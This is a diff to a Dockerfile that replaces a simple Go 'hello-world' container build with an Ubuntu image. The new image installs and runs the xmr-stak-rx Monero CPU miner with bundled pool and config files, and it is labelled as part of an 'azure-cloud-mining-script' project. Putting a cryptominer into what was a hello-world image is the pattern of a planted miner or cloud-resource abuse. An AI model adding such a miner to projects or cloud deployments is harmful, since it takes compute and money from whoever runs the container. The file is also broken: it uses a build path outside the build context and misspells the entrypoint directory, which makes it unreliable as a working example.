@@ -1,17 +1,14 @@
-# We need a golang build environment first
-FROM golang:1.16.0-alpine3.13
-
-WORKDIR /go/src/app
-ADD hello-world.go /go/src/app
-
-RUN go build hello-world.go
-
-# We use a Docker multi-stage build here in order that we only take the compiled go executable
-FROM alpine:3.13
+FROM ubuntu:18.04
 
 LABEL org.opencontainers.image.source="https://github.com/paoliveira/azure-cloud-mining-script"
 
-COPY --from=0 "/go/src/app/hello-world" hello-world
+RUN apt-get -y update
+RUN sysctl -w vm.nr_hugepages=4096
 
-ENTRYPOINT ./hello-world
+WORKDIR /xmr-stak-rx
+ADD ../xmr-stak-rx-linux-1.0.5-cpu.tar.xz /xmr-stak-rx/
+COPY config.txt /xmr-stak-rx/
+COPY cpu.txt /xmr-stak-rx/
+COPY pools.txt /xmr-stak-rx/
 
+ENTRYPOINT /xrm-stak-rx/xmr-stak-rx-linux-1.0.5-cpu/xmr-stak-rx
